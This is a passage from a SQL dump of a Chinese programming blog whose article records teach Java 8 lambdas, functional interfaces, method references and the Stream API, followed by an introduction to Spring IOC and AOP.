当然,实现类可以覆盖默认方法的实现，人家叫都叫默认方法，实现类当然可以覆盖啦  \n3. 为什么要这个特性?因为Java接口有个特点,实现了接口的类必须*强制要求实现*该接口的所有*要被实现方法*,这会造成一个问题,JDK8之前定义了一堆接口，里面的方法都是*固定死的*,我现在想给接口*升级*加更多的方法要求实现,可是我不能直接加呀，加上去后,所有实现这个接口的类全会被要求强制实现,这就麻烦了，整个代码全要改\n\n// 注意默认实现方法是已被接口自己实现的方法,而不是要*被实现的方法*，所以这并不会与函数接口要求冲突，像下面这样的例子\n\ninterface Interface1 {\n	// 只有一个要被实现的方法\n	int intNumber(int i);\n	// 不会冲突,因为这已经被实现了,lamdba不会找他为目标\n	default int multi(int x,int y) {\n		// 默认方法里调用被实现的方法\n		this.intNumber();\n		return x *  y ;\n	}\n}\n\n// 默认方法是可以被继承的,Java的接口是可以多继承的，默认方法也是可以被继承下来的\n\ninterface Interface1 {\n	default int intNumber(int i) {\n		return 1;\n	}\n}\ninterface Interface2 {\n	default int intNumber(int i) {\n		return 2;\n	}\n}\n// 会出现一个提示,实现哪个接口的默认方法\ninterface Interface3 extends Interface1,Interface2{\n	@Override\n	default int intNumber(int i) {\n		return Interface1.super.intNumber(i);\n	}	\n}\n// 如果继承的多个接口方法名相同,必须只能选一个继承\n```\n### 函数接口\n#### 输入与输出\n```java\n// 上次是我们自定义的函数接口,就是加了@FunctionalInterface注解的那个接口 \n@FunctionalInterface\ninterface IMoneyFormat {\n	String format(int i);\n}\nclass AchieveMoney {\n	private final int money;	\n	public AchieveMoney(int money) {\n		this.money = money;\n	}	\n	// 接收一个接口\n	public void printMoney(IMoneyFormat money) {\n		System.out.println(\"我的存款:\"+ money.format(this.money)); // 我的存款:500 \n	}\n} \npublic class Main{\n	public static void main(String[] args) {\n		AchieveMoney am = new AchieveMoney(500);\n		// 这是用来格式化金钱数的类 9999->9,999\n		am.printMoney(i -> new DecimalFormat(\"#,###\").format(i));\n	} \n} \n\n上面使用lambda表达式实现了一个函数接口方法然后返回的接口作为参数传递给了pringMoney这个方法中,money.format()时就调用了lambda表达式实现的方法,应该不难理解  \n上面的代码注意到两点\n 1. lambda表达式根本不在乎实现哪个接口，它只知道我返回一个接口,你拿什么接收,我就给你什么,具体接口名是什么不关心\n 2. lambda表达式不知道接口名也不知道方法名，它只关心输入参数和返回值,也就是输入和输出\n\n// 它既不关心接口名和方法名,那么我们就可以随便拿一个接口就行了,只要*输入和输出符合条件*就行了  \nJDK8就提供了这样函数接口，修改一下代码\n class AchieveMoney {\n	private final int money;\n	public AchieveMoney(int money) {\n		this.money = money;\n	}\n	// 输入是Integer类型,输出是String类型\n	// 我们把原来自己定义的接口删了，换成了这个Function\n	public void printMoney(Function<Integer,String> fn) {\n		System.out.println(\"我的存款:\"+ fn.apply(this.money));\n	}\n} \npublic class Main{\n	public static void main(String[] args) {\n		AchieveMoney am = new AchieveMoney(500);\n		// 符合条件的输入输出,看pringMoney方法\n		// 第一个泛型是输入类型，money 500\n		// 第二个泛型时输出类型, 被格式化金钱的字符串\n		Function<Integer,String> function = i -> new DecimalFormat(\"#,###\").format(i);\n		am.printMoney(function);\n	}\n}\n\n```\n\n#### 链式调用\n ```java\n class AchieveMoney {\n	private final int money;\n	public AchieveMoney2(int money) {\n		this.money = money;\n	}\n	public void printMoney(Function<Integer,String> fn) {\n		System.out.println(\"我的存款:\"+ fn.apply(this.money));\n	}\n} \npublic class Main{\n	public static void main(String[] args) {\n		AchieveMoney am = new AchieveMoney(500);\n		Function<Integer,String> function = i -> new DecimalFormat(\"#,###\").format(i);\n		am.printMoney(function); \n		// 链式调用\n		// 顺序依次为compose -> apply -> andThen\n		// componse 执行方法前执行,e是apply时传入的参数\n		// 我的存款:250,000\n		am.printMoney(function.compose(e -> e * e));		\n		// andThen 执行方法后执行,s是apply返回值\n		// 我的存款:人民币500\n		am.printMoney(function.andThen(s -> \"人民币\" + s));\n		// 一起使用\n		// 我的存款:人民币250,000\n		am.printMoney(function.andThen(s -> \"人民币\" + s).compose(e -> e * e)); \n	}\n}\n\n// 链式调用的两个方法compose和andThen\n1. compose,执行方法前执行,接收到的是apply时的参数\n2. andThen,执行方法后执行，接收到的时apply的返回值\n\n// 简单点的例子 \npublic class Main {\n	public static void main(String[] args) {\n		Function<Integer, Integer> origin = e -> e * 2;\n		Function<Integer, Integer> extra= e -> e * e;\n		// compose 先执行apply时的参数，后执行调用方法\n		// andThen 先执行调用方法，后执行apply的返回值\n		Integer apply = origin.compose(extra).apply(4);  \n		Integer apply2 = origin.andThen(extra).apply(4);  \n		// 4*4=16 -> 16*2=32\n		System.out.println(apply);// 32\n		// 4*2=8  -> 8*8=64\n		System.out.println(apply2);// 64\n	}\n}\n```\n### 常用函数接口\n函数接口只有这一个Function<输入,输出>吗?，当然不止,还要好几种，我们列举一下\n\n接口 | 输入参数 |返回类型 | 说明 \n-| :-: |:-: |:-: |  \nPredicate< T > | T |boolean| 布尔值 断言 \nConsumer< T > | T | / | 只输入,消费数据  \nSupplier< T > | / | T | 只输出,生产数据\nUnaryOperator< T > | T | T | 输入输出相同，参数一个,一元函数\nBinaryOperator< T,T > | (T,T) | T | 输入输出相同，参数两个,二元函数\nFunction< T,R > | T | R | 输入T输出R的函数\nBinaryOpeartor< T,U,R > | (T,U) | R | 2个输入的Function\n\n我们全部来用一遍试试\n```java\npublic class Main {\n	public static void main(String[] args) {\n		// 布尔值断言\n		Predicate<Integer> predicate = i -> i>0;\n		System.out.println(predicate.test(2));\n		// 输入无输出,消费\n		Consumer<String> consumer = s -> System.out.println(s);;\n		consumer.accept(\"消费\");\n		// 输出无输入，生产\n		Supplier<String> supplier = ()-> \"生产\";\n		System.out.println(supplier.get());\n		// 输入输出相同,一元函数\n		UnaryOperator<String> unaryOperator = s -> s;\n		System.out.println(unaryOperator.apply(\"一元\"));\n		// 输入输出相同两个参数,二元函数\n		BinaryOperator<String> binaryOperator = (s1,s2) -> s1+s2;\n		System.out.println(binaryOperator.apply(\"前s\", \"后s\"));\n		// 输入输出不同,最常用\n		Function<Integer,String> function = (Integer i) -> Integer.toString(i);\n		System.out.println(function.apply(100));\n		// 输入输出不同，两个参数\n		BiFunction<Integer, String, String> BiFunction = (i,s) -> Integer.toString(i) + s;\n		System.out.println(BiFunction.apply(1, \"2\"));\n	}\n}\n```\n### 隐式final\n```java\n// 你看lambda表达式像不像是一个匿名函数,虽然一直说它是返回接口\npublic static void main(String[] args) {\n	int weight = 5\n	// 只输入的函数接口 \n	Consumer<Integer> consumer = i ->System.out.println(i + weight);\n	consumer.accept(950)\n} \n\n// 对Java有经验的应该知道匿名内部类,匿名内部类中的值必须是final的,也就是说不能改变的值,像这样\npublic static void main(String[] args) {\n	int weight = 5;\n	// 报错了,提示weight必须加final\n	weight = 6;\n	new Thread(new Runnable(){\n		public void run() {\n			System.out.println(weight);\n		}	\n	}).start();\n}\n\n// lambda表达式的weight能不能修改昵\npublic static void main(String[] args) {\n	int weight = 5\n	// 报错了,weight必须是final\n	weight = 6;\n	// 只输入的函数接口 \n	Consumer<Integer> consumer = i ->System.out.println(i + weight);\n	consumer.accept(950)\n} \n\n// 然而都必须加final，表面上看是不用加final，其实还是得是final修饰\n\n// 为什么匿名内部类和lambda表达式中的值必须是final?\n1. 这里要知道一件事,Java的传递都是值传递而不是引用传递,每次参数传递的都是一份*被拷贝的值副本*，就是说Java中只有*值传递*，没有引用传递.  \n如果外面的值改变了,但内部的值不会被改变,因为Java是值传递的，内部的值只是一开始外部值的一个拷贝,从此之后内外值没有关系了,比如改变了其中一个值，另一个值并不会收到任何的影响,这会引发一个严重的问题,数据不统一。\n2. 还有另一个原因闭包,闭包这个词在JavaScript中常见,但Java对闭包的支持并不完整  \nJava要求所有被内部类访问的局部变量都使用final修饰也是有其原因的对于普通的局部变量而言，它的作用域就停留在该方法内当方法执行结束后，该局部变量也随之消失但内部类则可能产生隐式的闭包，闭包将使得局部变量脱离它所在的方法继续存在\n```\n### 闭包\n```javascript\n// JavaScript的闭包\n// 这么讲很突兀,但对JavaScript高级知识有经验的应该知道闭包操作  \n先看看闭包是什么，看下面代码\nfunction fn() {\n	let num = 1	\n	return function(a) {\n		if (a != undefined) {\n			return a;\n		}\n		return num;\n	}\n}\nlet fnc = fn()   \nfnc()	  // 1\nfnc(2)	// 2\n\n// 可以看出fn方法它本身内部有一个变量num，它在fn方法中的内部,而当调用fn时返回的是另一个方法,变量num相当于被包在方法里面了没有出来,JavaScript中常用这种方法来限制变量的作用域，而且它和普通函数不同,这个num只在第一次调用时初始化了，这个函数将自己的一切*隐藏到了自己的内部*，外部根本无从知道这件事，这就叫闭包\n\n// 但这种闭包操作如果没有使用好，会造成内存泄漏  \n// 这种返回函数的函数被称为*高阶函数*  \n```\n### 柯里化\n#### JavaScript的柯里化\n```javascript\n// 知道了高阶函数,那么就要了解柯里化这个概念,这个概念大部分在JavaScript的书籍中经常提及,Java中很少提及这个概念,因为除了编写框架之外很少会有人用到. \n// 看下面这个例子了解一下什么叫做柯里化\nfunction add(a) {\n	var temp = function(b) {\n		return add(a + b)\n	}\n	temp.valueOf = temp.toString = function() {\n		return a\n	}\n	var ans = add(1)(2)(3)\n	console.log(ans) // 6\n}\n```\n#### lambda的柯里化\n```java\n// 可以看出柯里化的基本概念就是运算结束后返回一个函数,然后调用后又返回函数  \n// 用lambda表达式来实现这个add(1)(2)(3)的效果\npublic static void main(String[] args) {\n	Function<Integer,Function<Integer,Function<Integer,Integer>>> add;\n	add = x -> y -> z -> x + y + z; \n	System.out.println(add.apply(1).apply(2).apply(3)); // 6\n}\n// 这样就相当完成了一个闭包柯里化，达成了上面js那样的效果，虽然不能够像js那样一直不停的调用\n\n// 上面的连续三个>可能会不能理解,缩短一个看看\npublic static void main(String[] args) {\n	// 输入了一个数字,返回了一个函数\n	Function<Integer,Function<Integer,Integer>> function = x -> y -> x + y;\n	// 第一次返回是一个Function,所以又可以调用				\n	System.out.println(function.apply(2).apply(3)); \n}\n// 你可以把它理解成这样的js代码\nfunction fn(a) {\n	return funtion)(b) {\n		return a + b; \n	}\n}\nconsole.log(fn(1)(2)) \n```', 0, 0, 218, 0, 0, '2018-08-11 15:38:33', '2019-01-17 15:38:33', 0, 0);
INSERT INTO `article` VALUES (9, 1, 'JDK8特性的方法引用和stream流编程', '2018/8/1534080203_1cef445c84a1f687f94db9b9537ce315.jpg', '### 方法引用\n```java\npublic class Main {\n	public static void main(String[] args) {\n		// 这是lambda的方式\n		Consumer<String> consumer1= (s) -> System.out.println(s);\n		consumer1.accept(\"data\");\n		// 这是方法引用的方式\n		Consumer<String> consumer2 = System.out::println;\n		consumer2.accept(\"data\");\n	}\n}\n\n// 方法引用只关心*输入和输出*\n// System.out.println(s);打印语句只要求输入一个参数来打印,它不输出返回值\n// 所以用Consumer就可以用接收这种格式的方法,引用语法就是System.out::println\n```\n#### 静态方法的引用\n```java\npublic Cell {\n	private String name = \"血小板\";\n	private int count = 100;\n	public static void todo(Cell cell) {\n		 System.out.println(cell + \"止血\");\n	}\n	@Override\n	public String toString() {\n		return this.name;\n	}\n}\npublic class Main {\n	public static void main(String[] args) {\n		// 静态方法的引用\n		Consumer<A> consumer2 = Cell::todo;\n		consumer2.accept(new Cell());// 血小板止血\n	}\n}\n// 静态方法依靠 类名::方法 进行引用，上面打印的应该是血小板止血\n```\n#### 非静态方法的引用\n```java\n// 非静态方法的引用*可以用类名也可以用实例*,先使用实例\npublic Cell {\n	private String name = \"血小板\";\n	private int count = 100;\n\n	public int incr(int count) {\n		System.out.println(cell + \"新增了\"+count);\n		this.count = count;\n		return this.count;\n	}\n	@Override\n	public String toString() {\n		return this.name;\n	} \n}\npublic class Main {\n	public static void main(String[] args) {\n		// 非静态方法的实例引用 \n		Cell cell = new Cell();\n		// 观察incr方法的输入和输出，发现都是Integer，所以可以用UnaryOperator \n		// 注意用的是实例引用,而不是类名\n		UnaryOperator<Integer> unaryOperator = cell::incr;\n		System.out.println(unaryOperator.apply(100)); // 血小板新增了100，返回后又打印了100 \n 	}   \n} \n```\n#### 隐式this\n```java\n// 非静态方法引用类名之前，得知道JDK的隐式this\npublic int incr(int count) {\n	System.out.println(cell + \"新增了\"+count);\n	// 为什么这里可以用this\n	this.count = count;\n	return this.count;\n}\n// 为什么非静态方法里面可以用this来指代调用该方法的对象?\n// 因为调用方法的对象会被JDK隐式的放到非静态方法的第一个参数，名叫this\n// 从编译的文件中可以看到这个操作，就像构造器中super()一样是个隐式操作\n\n// 所以incr方法实际编译后是这样的\npublic int incr(Cell this,int count) {\n	System.out.println(cell + \"新增了\"+count);\n	// 为什么这里可以用this\n	this.count = count;\n	return this.count;\n}\n\n// 但在IDE中是看不到第一个参数this的，你可以显式的写在方法的第一个参数中,即使你调用的方法只有一个参数也不会报错\npublic int incr(Cell this,int count) {\n	System.out.println(cell + \"新增了\"+count);\n	this.count = count;\n	return this.count;\n} \n\npublic static void main(String[] args) {\n	// 非静态方法的引用\n	Cell cell = new Cell();\n	cell.incr(100)// 并不会报错 \n}  \n\n// 知道了隐式this，就知道如何用类名去方法引用了\npublic int incr(Cell this,int count) {\n	System.out.println(cell + \"新增了\"+count);\n	this.count = count;\n	return this.count;\n}\npublic static void main(String[] args) {\n	// 非静态方法使用类名引用\n	BiFunction<Cell,Integer,Integer> bigFn= Cell::incr;\n	bigFn.apply(new Cell(), 100); \n} \n// 因为一个参数是实例对象，所以依靠类名引用你必须给第一个参数实例对象，否则没有实例对象又怎么能调实例的方法昵\n```\n#### 构造器引用\n```java\n// 构造器也是方法，所以也可以引用，注意一个误区,*构造器不是创建实例的*,真正创建实例对象的是*new关键字*\nclass Cell{\n	// 无参的构造器\n	public Cell() {\n	\n	}\n}\npublic static void main(String[] args) {\n		// 无参的构造器\n		Supplier<Cell> supplier = Cell::new;\n		System.out.println(\"new了一个对象\"+supplier.get());\n} \n\nclass Cell{\n	private String name = \"血小板\";\n	// 无参的构造器\n	public Cell(String name) {\n		this.name = name\n	}\n}\npublic static void main(String[] args) {\n		// 带参数的构造器引用\n		Function<String,Cell> function = Cell::new;\n		System.out.println(\"new了一个对象\"+function.apply(\"红细胞\"));\n} \n```\n### stream流\n```java\n// stream是一个*高阶迭代器*,*迭代器*,*迭代器*,可以说它是处理一个数据结构，而不是仅仅一个集合。\n// 迭代分成*外部迭代*和*内部迭代*,其实外部迭代就是你自己干的,内部迭代就是API帮你干的，你就是调了下它的API而已\n\npublic static void main(String[] args) {\n	int[] nums= {1,2,3};\n	// 传统外部迭代，这都是你自己干的，你自己写的求总数的逻辑\n	int sum = 0;\n	for (int i : nums) {\n		sum += i\n	}\n	System.out.println(\"总数:\"+ sum);\n	// stream内部迭代，你没写逻辑，你仅仅只是调用了一下API\n	int sum2 = IntStream.of(nums).parallel().sum();\n	System.out.println(sum2);\n}\n// 看上去简单很多，因为逻辑不要你写,你只要调用下API就行了。\n// 使用这个原因有两个\n1. 它很简洁，舒服\n2. 现在数据只有1,2,3，如果是是3亿的数据昵?，仅仅凭上面那种简单的求总和逻辑很明显性能不达标,因为是串行单线程的，只能慢慢计算\n3. 除非你自建线程池，把3亿数据拆分几万份，分别开启一个线程运算，最后进行合并,这可不好做\n4. 上面那个parallel()意思是开启*并行计算*，stream运算sum()时会把超过一定量的数据拆分给其他线程一同运算，最后进行数据合并\n```\n### 创建,中间,终止\n```java\npublic static void main(String[] args) {\n	List<Integer> list = new ArrayList();\n	list.add(1);list.add(2);list.add(3);\n	// 根据原来的集合重新获取集合,如js中的arr.map那样\n	List<Integer> newData = list.stream().map( num -> \n		num * 2 \n	).collector(Collectors.toList())\n	// forEach遍历 \n	list.stream().forEach(num -> {\n		System.out.println(num); // 2 4 6\n	})\n} \n\n上面代码看不懂没关系,后面会慢慢说明  \n我们先把第一个代码拆成三部分\n1. stream() 创建部分\n2. map() 中间部分,我们在中间部分进行操作，把每个数乘以2\n3. collect(Collectors.toList()) 终止操作，map中的新结果返回为一个List\n\n// 注意,中间部分可以有多个操作,比如排序,去重之类的,每次运行处理完一个中间部分操作后*返回一个新的stream*\n// 所以又可以进行中间操作或者终止操作,这叫*链式操作*，了解jQuery的应该知道什么叫链式操作\n\n// sorted,distinct,map都是中间操作，每次返回一个stream又可以操作,一直...的调用\n\nList<Integer> newData = list.stream().sorted().distinct().map( num -> \n	num * 2 \n).collector(Collectors.toList())\n// jQuery中\n$(\'#nav\').addClass(\'show\').siblings().removeClass(\'show\')\n\n// 你可以把它当成每次调用执行时返回调用者\n// 注意,只要你没调用*终止操作方法*就可以一直调用中间操作的部分 \n// 很明显collect(Collectors.toList())是一个终止操作，它要返回一个把经过中间操作处理后的数据新建为一个List了\n```\n#### 创建部分\n类型| 相关方法 \n-|-|  \n集合 | Collection.stream/.parallelStream |\n数组 | Arrays.stream |  \n数字 | IntStream/LongStream LongStream.of/.range/.rangeClosed |\n自定义 | Stream.generate/.iterate |\n\n```java\n// 每个创建部分的操作和意思\npublic static void main(String[] args) {\n	// 从集合创建\n	List<String> list = new ArrayList();\n	// 串行流\n	list.stream();\n	// 并行流\n	list.parallelStream(); \n\n	// 从数组创建\n	Arrays.stream(new int[]{1,2,3});\n\n	// 从数字创建\n	IntStream.of(1,2,3);\n	// 1-100的创建 包含100\n	LongStream.rangeClosed(1, 100);\n	// 1-99的创建 不包含100\n	LongStream.rangeClosed(1, 100);\n	// 生成随机数,limit指定生成数量\n	new Random().ints().limit(10); \n\n	// 自定义\n	Random random = new Random();\n	// 自己创建自己想要的类型的流,limit指定生成数量\n	Stream.generate(() -> random.nextInt()).limit(20);\n	// 自己给出一个种子值，第二个参数接收种子值并按一定规律生成数据,limit指定生成数量\n	Stream.iterate(1, item -> item + 1).limit(10);\n}\n```\n\n#### 中间部分\n类型| 相关方法 \n-|-|  \n有状态操作 | distinct | \n | sorted | \n | limit |\n | skip | \n-----| ---- |  \n无状态操作 | map |\n | flatMap |  \n | filter | \n | peek | \n | unordered |\n\n```java\n// 有状态和无状态的区别\n1. 有状态操作,我现在迭代操作的元素和前面几个后面几个*有关系*  \n2. 无状态操作,我现在迭代操作的元素和其他的*没有关系* \n\n// 由于中间部分操作需要很多的数据代码,这里就不给出具体代码，只将每个操作的具体意思记录  \n\n// 有状态操作\n1. distinct 去重,调用后开启,它的去重依据是对象的equals和hashCode,你可以重写对象这两个方法来制定你的去重标准\n2. sorted 排序,调用后开启,它可以获取一个Comparator比较器参数作为排序的标准,你也可以让对象实现Comparable接口重写compareTo方法来制定排序标准，个人推荐第一种，修改对象本身不建议\n3. limit 取出数量,不获取所有的对象,只获取一部分时使用\n4. skip 跳过数量,不从头开始获取，获取指定数量之后的对象 \n\n// 无状态操作\n1. map 遍历的是A对象集合，A对象下有个id属性，我不要整个A对象我只需要所有A对象的id，组成一个id列表，适用于用id列表去数据库查询对象的场景，很常用\n2. flatMap 遍历的是A对象集合，A对象下有个集合属性AA.我不要A对象,我需要所有A对象里的AA集合,组成AA列表，适用于两重集合的场景\n3. filter 过滤,遍历的是A对象集合,A对象里有个type属性,我只要type属性=2的A对象,其他的type值A对象我都不要,适用于拆分集合场景\n4. peek 像forEach一样遍历,但它是中间操作，你可以在遍历中对每个A对象做一些事情,记住,它是中间操作,你必须调用终止操作,它才会被执行，适用场景很少,一般都用终止操作forEach代替它\n5. unordered 并行流，它会打乱集合元素的顺序，调用后直接开启,，它开启了线程池拆分了集合数据,整理后直接合并，没有把顺序恢复,适用场景在不关心集合元素排序时\n6. parallel 并行流，和unordered一样会打乱元素顺序，一般遍历数字id的时候会开启它\n7. sequential 串行流,可以从并行流改回到串行流,\n\n// parallel和sequential主要是改变了stream流Head头的并行标志,并行标志以最后一次为准，Head头是stream的运行机制之一 \n\n// 运行机制\nstream流里面有一个sourceStage指向header属性,所有的操作都是链式调用,一个元素只迭代一次,每一次中间操作返回一个处理后的新的stream。parallel和sequential 这两个操作不创建流，只修改head的并行标志,header头就是stream链式调用的实现 \n```\n#### 终止部分\n类型| 相关方法 \n-|-|  \n短路操作 | findFirst/findAny | \n | allMatch/anyMatch/noneMatch |   \n-----| ---- |\n非短路操作 | forEach/forEachOrdered |\n | collect |  \n | toArray | \n | reduce | \n | min/max/count|\n\n\n```java\n// 短路操作和非短路操作区别\n1. 短路操作，不需要等待所有元素迭代完毕就可以返回结果  \n2. 非短路操作，等待所有元素迭代完毕后返回结果 \n\n// 短路操作\n1. findFirst 获取第一个元素\n2. findAny 随便获取一个元素\n3. allMatch 所有元素的某个属性满足某个条件,比如全要性别男\n4. anyMatch 至少有一个元素的某个属性满足某个条件,比如只要有一个性别男就行\n5. noneMatch 所有元素的某个属性不满足某个条件，比如一个性别男都不要\n6. xxxMatch返回的都是一个boolean值，条件是否满足\n\n// 非短路操作\n1. forEach 遍历\n2. forEachOrdered 在开启中间操作parallel后使用,可以保证parallel并行合并后恢复原有的元素顺序\n3. collector 将遍历得到的结果转换为集合，像collector(Collectors.toList())这样\n4. toArray 将遍历得到的结果转换为数组\n5. reduce 第一个参数是默认值,第二参数是一个二元函数接口,处理本次元素和下一个元素的关系\n6. max 最大的对象,它接收一个Comparator比较器作为比较依据,也可以直接使用lambda表达式简化,两个参数分别是本次和下次元素对象\n7. min 最小的对象，和max一样接收一个Comparator比较器\n8. count 长度，返回结果的长度,和list.size()是一个意思\n```\n```java\npublic static void main(String[] args) {\n	List<String> data = new ArrayList();\n	data.add(\'a1\');data.add(\"b2\");data.add(\"c3\");\n	String str = \"HELLO\";\n	// forEach\n	data.forEach(item -> {\n		System.out.println(item);// a1 b2 c3\n	})\n	// forEachOrdered\n	// 与parallel并行流一起使用时会保证合并数据顺序恢复\n	str.chars().parallel().forEachOrdered(i -> System.out.println(i)); \n	// collector收集器,将遍历得到的结果转换为集合，像collector(Collectors.toList())这样,还可以做额外的处理\n	List<String> list = data.stream().map( item -> item.substring(0, 1)).collect(Collectors.toList()); \n	// toArray,变为数组\n	Object[] array = list.stream().toArray();\n	// reduce\n	// 第一个参数是结果默认值,第二参数是一个二元函数接口,处理本次元素和下一个元素的关系\n	// 计算元素的字符串总长度\n	Integer reduce = list.stream().map(s -> s.length()).reduce(0,(s1,s2) -> s1 + s2);\n	// count 长度，返回结果的长度,和list.size()是一个意思\n	// max 最大的对象,它接收一个Comparator比较器作为对象比较依据,也可以直接使用lambda表达式简化,两个参数分别是本次和下次元素对象\n	// min 最小的对象，和max一样接收一个Comparator比较器 \n	long count = list.stream().count();\n	list.stream().max((s1,s2) -> s1.length() - s2.length()).get();\n	list.stream().min((s1,s2) -> s1.length() - s2.length()).get();\n}\n```\n#### 惰性求值\n```java\n 一般都会觉得操作步骤是这样的: 创建部分->中间部分..->终止部分\n如果我不执行终止操作那它应该会运行中间部分,但是其实不会。  \n*没有调用终止操作的话它是不会执行的* \n\n// 这里就是stream流的一个概念,*惰性求值*，它只是一个概念理论，不是要我们自己操作的.\n1. 惰性求值:它先做了一个方法的引用\n2. 在终止操作没有调用的情况下，中间操作都不会执行,比如上面没有调用collect(Collectors.toList())的话，那么.sorted().distinct().map()都不会被执行，即使你在里面写了逻辑代码也不会被执行 \n```\n#### 收集器\n```java\ncollect是用的最多的，它的参数是一个Collectors,被称为收集器，它除了可以转换集合还可以做一些额外需求\n\n// 转换集合\npublic static void main(String[] args) {\n	List<User> data = new ArrayList();\n	// 这种方式编译后会多生成一个lambda$0这样的函数\n	List<String> collect1 = data.stream().map(item -> item.getName()).collect(Collectors.toList());\n	// 这种方法引用的方式编译后不会多生成函数\n	// 用方法引用更加的专业\n	List<String> collect2 = data.stream().map(User::getName).collect(Collectors.toList());\n}\n\n// 转换集合类型\npublic static void main(String[] args) {\n 	// 转换类型\n	TreeSet<String> treeSet = data.stream().map(User::getName).collect(Collectors.toCollection(TreeSet::new));\n}\n\n// 统计汇总的信息\npublic static void main(String[] args) {\n 	// 统计汇总信息\n		IntSummaryStatistics iss = data.stream().collect(Collectors.summarizingInt(User::getAge));\n		// 它会打印这些对象年龄的汇总信息\n		// 元素数量,年龄总数,年龄最小值,年龄最大值,平均值\n		System.out.println(iss); \n}\n// 分组\npublic static void main(String[] args) {\n	// 将相同年龄的用户存放在一起\n	// 像这样的数据结构\n	/*{\n			1: [[..],[...],[...]]\n			2: [[..],[...],[...]]\n			3: [[..],[...],[...]]\n	}*/ \n 	Map<Integer, List<User>> collect = data.stream().collect(Collectors.groupingBy(User::getAge));	\n}\n\npublic static void main(String[] args) {\n	// 将相同性别的用户存放在一起\n	// 像这样的数据结构\n	/*{\n			true: [[...],[...],[...]]\n			false: [[...],[...],[...]]\n	}*/ \n	Map<Boolean, List<User>> map = data.stream().collect(Collectors.partitioningBy( u -> u.isGender() == true));	  \n}\n\n// 收集器可以嵌套\npublic static void main(String[] args) {\n	// 男女分块数据的总数，收集器嵌套\n	// 还可以额外嵌套求其他数值\n	Map<Boolean, Long> collect3 = data.stream().collect(Collectors.groupingBy(User::isGender,Collectors.counting()));\n}\n```', 0, 0, 167, 0, 0, '2018-08-11 21:47:37', '2019-01-17 21:47:37', 0, 0);
INSERT INTO `article` VALUES (10, 1, 'SpringIOC与AOP及事务传播', '2019/1/1547015298_72328479_p0.jpg', '### SpringIOC\n![SpringSpringIOC传统方式的实现类耦合.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624594245_Spring-SpringIOC-传统方式的实现类耦合.png)\n![SpringSpringIOC解决实现类耦合.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624594245_Spring-SpringIOC-解决实现类耦合.png)\n```java\n// 为什么要ioc\n1. tomcat的流程是接收http请求,然后封装后转发给我们自己写的servlet\n2. 最后由我们手动创建实现类的对象去执行业务逻辑。\n3. 这会产生一个弊端：耦合性太高。\n4. 如果需要更改实现类,那么需要在所有new实现类的地方都要修改,然后重新大量测试\n\n比如在一个tomcat+servlet的这样的系统里，有几十个地方，都是直接用MyService myService = new MyServiceImpl()，直接创建、引用和依赖了一个MyServiceImpl这样的一个类的对象。\n那么这几十个地方，都跟MyServiceImpl类直接耦合在一起了\n我现在不想要用MyServiceImpl了，我用的是NewMyServiceManagerImpl implements MyService，内部所有的实现逻辑都不同了\n此时很麻烦，我们需要在几十个地方里，都去修改对应的MyServiceImpl这个类，切换为NewMyServiceManagerImpl这个类\n改动代码成本很大，改动完以后的测试的成本很大，改动的过程中可能很复杂，出现一些bug，此时就会很痛苦，归根结底，代码里，各种类之间完全耦合在一起，出现任何一丁点的变动，都需要改动大量的代码，重新测试，可能还会有bug\n\n// springioc作用\n1. tomcat启动后会去启动一个spring容器，由spring将对应的bean进行创建于初始化，并且管理对应的依赖关系\n2. 这里就是控制反转，将类的调用关系由主动变成了被动，交给了spring去管理,spring相当于一个类实例的仓库。\n3、有了这个机制以后，就可以轻松的完成解耦，然后引入spring mvc其实就是由它实现了之前servlet的一些功能，处理包装请求，然后一些filter，最终转发到我们的controller，最终调用实现类完成业务逻辑。\n4、整个IOC容器就像是一个map，key是对应的名称，value是通过反射创建的bean。比较明显的作用就是解耦。\n\n现在我们只要在这个工程里通过maven引入一些spring框架的依赖，就能用它的ioc功能\ntomcat在启动的时候，直接会启动spring容器\nspring容器，会根据你的xml配置或者注解，去实例化你的bean对象，然后根据xml配置或者注解，去对bean对象之间的引用关系，去进行依赖注入，某个bean依赖了另外一个bean\n\n// 核心是反射\nspring ioc底层的核心技术是反射，他会通过反射的技术，直接根据你的类去自己构建对应的对象出来\n让系统的类与类之间彻底的解耦合\n之前有几十个类都使用了@Resource这个注解去标注MyService myService，几十个地方都依赖了这个类\n如果要修改实现类为NewMyServiceManagerImpl ,那么直接将新的NewMyServiceManagerImpl标注为@Service,把旧的MyServiceImpl的@Service去掉就可以了\n代码层面组件切换解耦,不用大量改动代码,避免重复测试,解决传统-组件切换麻烦,而spring使用bean注入方式,底层反射实现\n\n// spring创建对象实例是线程不安全的\nSpring容器中的bean可以分为5个范围：\n（1）singleton：默认，每个容器中只有一个bean的实例\n（2）prototype：为每一个bean请求提供一个实例\n	一般来说下面几种作用域，在开发的时候一般都不会用，99.99%的时候都是用singleton单例作用域\n（3）request：为每一个网络请求创建一个实例，在请求完成以后，bean会失效并被垃圾回收器回收\n（4）session：与request范围类似，确保每个session中有一个bean的实例，在session过期后，bean会随之失效\n（5）global-session\n线程不是安全的，spring bean默认是singleton，是单例是线程不安全的\njava web系统里一般来说很少在spring bean里放一些实例变量，一般情况下他们都是多个组件互相调用，最终去访问数据库的\n\n```\n### SpringAOP\n![SpringSpringAOP.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624594245_Spring-SpringAOP.png)\n```java\n// 为什么要springaop\n1. 很多的业务代码需要在每次处理时都要做,比如说service层中每次都调用前开始事务,调用完或异常后结束事务\n2. 这每次的前后逻辑都是一样的,就是开始事务和结束事务\n3. 每个service类的每个方法我都要前后加上这个,这太麻烦了,代码也非常难看,一个东西重复了上百次\n4. 我们需要一个类似于拦截器一样的东西来拦截service的调用前后逻辑,springaop就是因此诞生\n\n// springaop的作用\n1. 做一个切面，怎么说呢 MyServiceXXXX的这种类，在这些类的所有方法中，都去织入一些代码\n2. 在所有这些方法刚开始运行的时候，都先去开启一个事务，在所有这些方法运行完毕之后，去根据是否抛出异常来判断一下，如果抛出异常，就回滚事务，如果没有异常，就提交事务\n3. springaop就是在ioc依赖注入的时候,给你注入的类实际上是个你写的类的一个代理对象\n4. 这个代理对象是spring生成的,它持有你写的那个实际类的对象引用,然后你调用的时候实际上是调用的它这个代理类的方法\n5. 